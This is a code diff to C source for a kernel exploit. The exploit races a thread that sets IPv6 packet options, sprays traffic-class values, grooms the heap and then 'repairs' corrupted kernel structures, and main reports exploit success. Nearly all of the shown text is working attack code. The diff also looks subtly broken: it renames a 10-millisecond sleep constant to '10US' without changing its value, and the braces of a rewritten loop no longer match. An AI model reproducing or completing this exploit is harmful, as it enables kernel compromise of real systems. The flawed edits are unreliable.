@@ -28,7 +28,7 @@
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0"
 #define NANOSLEEP_75US "\0\0\0\0\0\0\0\0\x38\x2a\x01\0\0\0\0\0"
 #define NANOSLEEP_50US "\0\0\0\0\0\0\0\0\x88\x13\0\0\0\0\0\0"
-#define NANOSLEEP_10MS "\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0"
+#define NANOSLEEP_10US "\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0"
 
 #define MAX_ATTEMPTS 10
 #define HEAP_GROOM_COUNT 100
@@ -143,25 +143,21 @@ struct opaque {
 
 void* use_thread(void* arg) {
     struct opaque* o = (struct opaque*)arg;
-    char buf[CMSG_SPACE(sizeof(int))];
-    struct cmsghdr* cmsg = (struct cmsghdr*)buf;
-    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
-    cmsg->cmsg_level = IPPROTO_IPV6;
-    cmsg->cmsg_type = IPV6_TCLASS;
-    *(int*)CMSG_DATA(cmsg) = 0;
+    char buf[CMSG_SPACE(sizeof(int))] = {0};
 
-    int poll_count = 0;
-    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
-        if (set_pktopts(o->master_sock, buf, sizeof(buf)))
-            *(volatile int*)0;
+    ((struct cmsghdr*)buf)->cmsg_len = CMSG_LEN(sizeof(int));
+    ((struct cmsghdr*)buf)->cmsg_level = IPPROTO_IPV6;
+    ((struct cmsghdr*)buf)->cmsg_type = IPV6_TCLASS;
+    *(int*)CMSG_DATA((struct cmsghdr*)buf) = 0;
 
-        if (++poll_count % 100 == 0) {
-            nanosleep(NANOSLEEP_100US, NULL);
+    while (!*(volatile int*)&o->triggered &&
+        get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
+        set_pktopts(o->master_sock, buf, sizeof(buf));
         }
-    }
 
-    o->triggered = 1;
-    o->done1 = 1;
+        *(volatile int*)&o->triggered = 1;
+    *(volatile int*)&o->done1 = 1;
+
     return NULL;
 }
 
@@ -345,7 +341,7 @@ void validate_and_repair_kernel_structures() {
         if (current_idt_size < 0xFE || current_idt_base == 0) {
             aggressive_heap_reclamation();
             flush_ipv6_option_pools();
-            nanosleep(NANOSLEEP_10MS, NULL);
+            nanosleep(NANOSLEEP_10US, NULL);
         } else {
             break;  // Kernel structures look good
         }
@@ -384,7 +380,7 @@ void restore_kernel_state() {
             stabilize_kernel_memory();
         }
         
-        nanosleep(NANOSLEEP_10MS, NULL);
+        nanosleep(NANOSLEEP_10US, NULL);
     }
 }
 
@@ -585,8 +581,7 @@ int main() {
 
     comprehensive_cleanup(&cleanup_state);
     aggressive_heap_reclamation();
-    nanosleep(NANOSLEEP_10MS, NULL);
+    nanosleep(NANOSLEEP_10US, NULL);
     
     return exploit_success ? 0 : 1;
 }
-
